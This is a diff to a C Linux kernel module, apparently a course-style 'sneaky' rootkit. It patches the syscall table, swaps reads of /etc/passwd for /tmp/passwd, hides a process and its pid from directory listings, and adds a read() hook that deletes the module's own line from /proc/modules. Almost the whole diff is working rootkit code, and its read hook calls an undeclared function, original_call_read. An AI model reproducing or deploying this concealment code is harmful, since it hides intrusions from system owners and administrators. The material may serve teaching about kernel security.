@@ -29,6 +29,14 @@ void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81070730;
 //We're getting its adddress from the System.map file (see above).
 static unsigned long *sys_call_table = (unsigned long*)0xffffffff81a00200;
 
+//Function pointer will be used to save address of original 'open' syscall.
+//The asmlinkage keyword is a GCC #define that indicates this function
+//should expect ti find its arguments on the stack (not in registers).
+//This is used for all system calls.
+asmlinkage int (*original_open)(const char *pathname, int flags, mode_t mode);
+asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
+asmlinkage ssize_t (*original_read)(int fd, void *buf, size_t count);
+
 //getdents function will fill in an array of “struct linux_dirent” objects, 
 //one for each file or directory found within a directory.
 //Make sure that the “struct linux_dirent” is interpreted correctly:
@@ -43,14 +51,8 @@ static char *sneaky_process_id = "";
 module_param(sneaky_process_id, charp, 0);
 MODULE_PARM_DESC(sneaky_process_id, "sneaky_process pid");
 
-//Function pointer will be used to save address of original 'open' syscall.
-//The asmlinkage keyword is a GCC #define that indicates this function
-//should expect ti find its arguments on the stack (not in registers).
-//This is used for all system calls.
-asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
-asmlinkage int (*original_open)(const char *pathname, int flags, mode_t mode);
-//asmlinkage ssize_t (*original_read)(int fd, void *buf, size_t count);
-
+static int proc_opened = 0;
+static int module_opened = 0;
 
 //Define our new sneaky version of the 'open' syscall
 asmlinkage int sneaky_sys_open(const char *pathname, int flags, mode_t mode)
@@ -58,6 +60,10 @@ asmlinkage int sneaky_sys_open(const char *pathname, int flags, mode_t mode)
 	const char *src_file = "/tmp/passwd";
 	if(strcmp(pathname, "/etc/passwd") == 0){
 		copy_to_user((void*)pathname, src_file, strlen(src_file)+1);
+	} else if (strcmp(pathname, "/proc") == 0) {
+		proc_opened = 1;
+	} else if (strcmp(pathname, "/proc/modules") == 0) {
+		module_opened = 1;
 	}
 	return original_open(pathname, flags, mode);
 }
@@ -68,18 +74,44 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp, u
 	struct linux_dirent *cur = dirp;
 	int i = 0;
 	while (i < rtn) {
-		if ((strcmp(cur->d_name, "sneaky_process") == 0) || (strcmp(cur->d_name, sneaky_process_id) == 0)) {
+		if ((strcmp(cur->d_name, "sneaky_process") == 0) || ((strcmp(cur->d_name, sneaky_process_id) == 0) && (proc_opened == 1))) {
 			int reclen = cur->d_reclen;
 			char *next_rec = (char *)cur + reclen;
 			int len = (size_t)dirp + rtn - (size_t)next_rec;
 			memmove(cur, next_rec, len);
 			rtn -= reclen;
+
+			if (proc_opened == 1) {
+				proc_opened = 0;
+			}
 			continue;
 		}
 		i += cur->d_reclen;
 		cur = (struct linux_dirent*) ((char*)dirp + i);
 	}
 	return rtn;
+}
+
+
+asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count){
+	char * ptr1 = NULL;
+	char * ptr2 = NULL;
+	ssize_t new_size1;
+	ssize_t new_size2;
+	ssize_t size = (*original_call_read)(fd, buf, count);
+	if(size>0 && module_opened==1 && ((ptr1=strstr(buf,"sneaky_mod"))!=NULL)){
+		ptr2 = ptr1;
+		while(*ptr2 != '\n'){
+			++ptr2;
+		}
+		new_size1 = (ssize_t)(size - (ptr2 + 1 - (char*)buf));
+		new_size2 = (ssize_t)(size - (ptr2 + 1 - ptr1));
+		++ptr2;
+		memmove(ptr1, ptr2, new_size1);
+		module_opened = 0;
+		return new_size2;
+	}
+	return size;
 }
 
 
@@ -109,11 +141,9 @@ static int initialize_sneaky_module(void)
 	original_open = (void*)*(sys_call_table + __NR_open);
 	*(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
 
-	//original_read = (void*)*(sys_call_table + __NR_read);
-	//*(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;
+	original_read = (void*)*(sys_call_table + __NR_read);
+	*(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;
 	
-
-
 	//Revert page to read-only
 	pages_ro(page_ptr, 1);
 	//Turn write protection mode back on
@@ -140,9 +170,9 @@ static void exit_sneaky_module(void)
 
 	//This is more magic! Restore the original 'open' system call
 	//function address. Will look like malicious code was never there!
-	*(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
 	*(sys_call_table + __NR_open) = (unsigned long)original_open;
-	//*(sys_call_table + __NR_read) = (unsigned long)original_read; 
+	*(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
+	*(sys_call_table + __NR_read) = (unsigned long)original_read; 
 
 	//Revert page to read-only
 	pages_ro(page_ptr, 1);
